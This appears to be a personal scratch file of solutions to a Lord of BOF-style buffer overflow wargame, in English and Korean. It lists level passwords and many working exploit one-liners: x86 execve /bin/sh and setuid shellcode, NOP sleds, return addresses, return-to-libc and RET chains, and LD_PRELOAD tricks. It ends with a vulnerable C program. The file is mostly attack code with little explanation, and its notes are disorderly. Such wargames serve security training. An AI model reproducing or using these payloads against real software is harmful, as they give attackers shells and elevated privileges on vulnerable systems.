1. gate : gate
gremlin : hello bof world(GOT)(환경변수 사용)

2. cobolt : hacking exposed
PL : ./cobolt `python -c 'print "A"*20+"\x80\xf6\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' 

3. goblin : hackers proof
PL : (python -c 'print "A"*20+"\x80\xf6\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat) | ./goblin

4.orc: cantata
PL : ./orc `python -c 'print "A"*44+"\x84\xf6\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

5. wolfman : love eyuna
PL : ./wolfman `python -c 'print "A"*44+"\x84\xf6\xff\xbf" + "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

6. darkelf : kernel crashed
PL : ./darkelf `python -c 'print "A"*44+"\x23\xfc\xff\xbf"'` `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

7. orge : timewalker
PL : /home/darkelf/../darkelf/../darkelf/../darkelf/../darkelf/../darkelf/././orge `python -c 'print "A"*44+"\x28\xf8\xff\xbf"'` `python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
/home/darkelf/orge => 18
/../orge => 8
/../darkelf => 11 * 5 
/. => 2 *2
/home/darkelf/../darkelf/../darkelf/../darkelf/../darkelf/../darkelf/././orge
/home/darkelf/../darkelf/../darkelf/../darkelf/../darkelf/../darkelf/./tmp/p8

0xbffffaf0:
0xbffffaa8


8. troll : aspirin
21(\x90) + 23(Shellode) + (bufferAddr) 
PL : $ exec -a `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` ./troll `python -c 'print "A"*44 + "\x30\xfc\xff\xbf"'`

9. vampire : music world

PL : $ ./vampire `python -c 'print "\x90" * 44 + "\xff\xff\xfe\xbf" + "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

10. skeleton : shellcoder
PL : 	$ ln -s skeleton `python -c 'print "\x90" * 100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
	$ ./`python -c 'print "\x90" * 100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'` `python -c 'print "A" *44 + "\xaa\xff\xff\xbf"'`
/bin/sh without \x2f
\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

11. golem : cup of coffee
use shared library(PRELOAD)
PL: 	$ cat int shrlibattack(){return 0;} > shrlib.c
	$ gcc -fPIC -shared shrlib.c -o `python -c 'print "\x90" *100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
	$ export LD_PRELOAD=`python -c 'print "/home/skeleton/ "\x90" *100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
	$ ./golem `python -c 'print "A"* 44 + "\xfc\xf5\xff\xbf"'`

12. darkknight : new attacker
use ebp, stack
PL:	$ ./darkknight `python -c 'print "\x90" * 15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xe0"'`

13. bugbear : new divide
	-> figure out by testing i guess(try system on your own)..
PL:	$ ./bugbear `python -c 'print "A"* 44 +"\xe0\x8a\x05\x40" + "\xf9\xbf\x0f\x40"*2'` 

system 위치
use dbg to find system address and then find "/bin/sh\x00" location and locate it 
/bin/sh : 0x400fbff9
use find.c (memcmp)



./giant "`python -c 'print "A"*44 + "\x48\x9d\x0a\x40" +"\xae\x8a\x05\x40"*2 + "\xf9\xbf\x0f\x40"'`"

	
14. giant : one step closer
PL:	$ ./giant "`python -c 'print "A"*44 + "\x48\x9d\x0a\x40" +"\xe0\x8a\x05\x40" + "\xf9\xbf\x0f\x40"*4'`"

- must use execve
- must find /bin/sh
use RTL Chain
EXECVE			\x48\x9d\x0a\x40
SYSTEM			\xe0\x8a\x05\x40
RET			\xf9\xbf\x0f\x40	
ARG1(/bin/bash\x00)	\xf9\xbf\x0f\x40	400fbff9
			\xf9\xbf\x0f\x40

15. assassin : pushing me away
USE RET chain

A*44
ret in head 	0x804851e		\x36\x83\x04\x08
system address	0x40058ae0		\xe0\x8a\x05\x40			
trash value				\xf9\xbf\x0f\x40
/bin/bash	0x400fbff9		\xf9\xbf\x0f\x40

./assassin `python -c 'print "A"* 44 + "\x36\x83\x04\x08"+"\xe0\x8a\x05\x40" +"\xf9\xbf\x0f\x40"*2'`

16. zombie_assassin : no place to hide
PL : $ ./zombie_assassin `python -c 'print "\xa0\xfa\xff\xbf" + "\xac\xfa\xff\xbf"+"\x90" * 7+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xa0\xfa\xff\xbf"+"\x17\x85\x04\x08"'`


STACK TOP(low address)
-----------
Trash					"\xa0\xfa\xff\xbf"	
stack + 4 (address to inst) 0xbffffaa4	"\xac\xfa\xff\xbf"		
nopslide(7) + SHellcode(25)		"\x90"*7+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
STACK address				"\xa0\xfa\xff\xbf"
leave RET address	    0x08048512	"\x17\x85\x04\x08"	
-----------
STACK BOTTOM(High address)

17. succubus: here to stay
	- 도->게->걸->윷->모
	- do의 retun address를 mo로 바꿔주기
	- arg 로 "/bin/bash" 주소 넣어주기

CHECK	0x08049a90		"\x90\x9a\x04\x08"

DO	0x080487ec		"\xec\x87\x04\x08"
GYE	0X080487bc		"\xbc\x87\x04\x08"
GUL	0x0804878c		"\x8c\x87\x04\x08"
YUT	0x0804875c		"\x5c\x87\x04\x08"
MO	0x08048724		"\x24\x87\x04\x08"
Trash				"AAAA"
"\bin\sh" loc 0xbffffaa8	"\xa8\xfa\xff\xbf"
"\bin\sh/x00"			"\x2f\x62\x69\x6e"
0x2f62696e			"\x2f\x2f\x73\x68"
0x2f736800

18. 

STRCPY GOT 0x08048410		"\x10\x84\x04\x08"
       PLT 0x400767b0

strcpy 로 ret 에 shellcode를 복붙

BUFFER + SFP 	"A"*44		
STR_ADR(GOT)	0x08048410	
		0x080486ba
 
Overwrote	"XXXX"
Arg1		"Overwrote" 주소 esp + 44 + 8   0xbffffa90	"\x90\xfa\xff\xbf"
arg2		SHELLCODE 주소의 주소 esp + 44 + 20  0xbffffa6c:	"\xac\xfa\xff\xbf"

shellcode with 환경변수 

r `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x10\x84\x04\x08" + "XXXX" +"\xac\xfa\xff\xbf"+ "\x90\xfa\xff\xbf"+ "\xac\xfa\xff\xbf" + "\x6c\xfa\xff\xbf"'`

`python -c 'print "\x90"*15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xa4\xfa\xff\xbf" + "\x10\x84\x04\x08" + "XXXX" + "\xe0\xfa\xff\xbf" + "\xa4\xfa\xff\xbf" +"\xd8\xfa\xff\xbf"'`

strcpy 						"\x10\x84\x04\x08"
stack address 	esp = 0xbffffa9c		"\xa4\xfa\xff\xbf"
AAAA loc = "0xbffffae0"				"\xe0\xfa\xff\xbf"
shellcode address's address = 0xbffffad8	"\xd8\xfa\xff\xbf"

stack address + 4 + alpha = "0xbffffab0" 4	"\xb0\xfa\xff\xbf" ret-4
strcpy 						"\x10\x84\x04\x08" ret
strret >					"AAAA"		   ret+4
AAAA loc = 		0xbffffad8		"\xe0\xfa\xff\xbf" ret+8    
SHELLOCODE address's address = aaaa l		"\xd4\xfa\xff\xbf" ret+12				

 					12	""

./nightmare `python -c 'print "\x90"*15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xb0\xfa\xff\xbf" + "\x10\x84\x04\x08" + "XXXX" +"\xe0\xfa\xff\xbf" + "\xd4\xfa\xff\xbf"'`

SFP => shellcode 주소      : 0xbffffab2 "\xb0\xfa\xff\xbf"
RET (strcpy(.plt))         :            "\x10\x84\x04\x08"
next RET(AAAA) =>          :  

aaaaa
ARG1
ARG2




19+25

44-25

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

`python -c 'print "A"*44+"\x10\x84\x04\x08"'`



`python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\xa8\xfa\xff\xbf" +"\x2f\x62\x69\x6e" + "\x2f\x2f\x73\x68"'`

r `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xa0\xfa\xff\xbf"'`


PL: 	`python -c 'print "\x90"*44 +"\x48\x9d\x0a\x40"'`




POP *3ret : 
	`python -c 'print "\x90"*1000 +"\x5b\x5b\x5b\xc3"'
0x080da023


addr(/bin/sh) <=system 꺼 쓰자
argv : addr(/bin/sh\x00\x00) <= 인정
0x0 
ret
addr(execve)
	=> &execve_offset : 00091d48



0x8048476

$ exec -a `python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` ./skeleton `python -c 'print "\x90"*44 + "\xba\xff\xff\xbf"'`
exec -a `python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` ./skeleton `python -c 'print "\x90"*40 + "\xff\xff\xfe\xbf"*2'`


/bin/sh without \x2f
	\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

0xbfffffdf:      "/home/vampire/tmp/../tmp/p10"
0xbfffffd1:      "/home/vampire/tmp/.././././././././tmp/p10"

SHELLCODE :> 23
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

40-23 + 


tmp/p18 `python -c 'print "\x90"* 15 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"


c
25

`python -c 'print "\x90" * 15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xdc"'`


$ exec -a `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` ./troll `python -c 'print "\x90"*40 + "\x30\xfc\xff\xbf"*2'`

./darkelf `python -c 'print "A"*44+"\x84\xfc\xff\xbf"'` `python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`


r `python -c 'print "A"*44 +"\xbf\xbf\xbf\xbf"'`



0x6d6f682f      0x61642f65      0x6c656b72      0x6d742f66
/home/darkelf/tmp/p8 => 20
0xbffffc21c:     0x38702f70

`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

./troll `python -c 'print"A"*44 +"BBB"+"\xbf" +"\x00" +"CCCC"'`

exec ./p8  -a `python 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

`python -c 'print "\x90" * 44 + "\x28\x88\xfe\xbf"+"\x90" * 10000'+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

0x400309cb + 24

pdntspa
apstndp



EGG
0xbffffdc2
\xc2\xfd\xff\xbf

\xcb\x09\x03\x40

/bin/sh
 0xbffffdc0
\xc0\xfd\xff\xbf

tmp/p8
AAAA AAAA AAAA AA

\x66\xb8\xf6\x01\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80
0x01f6
6

0xbffffa68
\x68\xfa\xff\xbf
export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

str : 23 => \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

buf addr : 0xbffffa84 -> 0xbffffae8 -> \xe8\xfa\xff\xbf

SETUID + /BIN/SH
\x66\xb8\xf6\x01\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80


0xbfffd3b8



`python -c 'print "\x90" * 44 + "BB" +"\xfe\xbf"+"\x90" * 10000'`

export LD_PRELOAD=`python -c 'print "/home/skeleton/"+ "\x90" *100 +"\x31\xc0\x50\xb8\x2e\x2e\x73\x68\x66\x05\x01\x01\x50\xb8\x2e\x62\x69\x6e\x04\x01\x50\x89\xe3\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dumpcode.h>

main(int argc, char *argv[])
{
        char buffer[40];
        char *addr;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // check address
        addr = (char *)&strcpy;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with strcpy()\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // dangerous waterfall
        memset(buffer+40+8, 'A', 4);
}

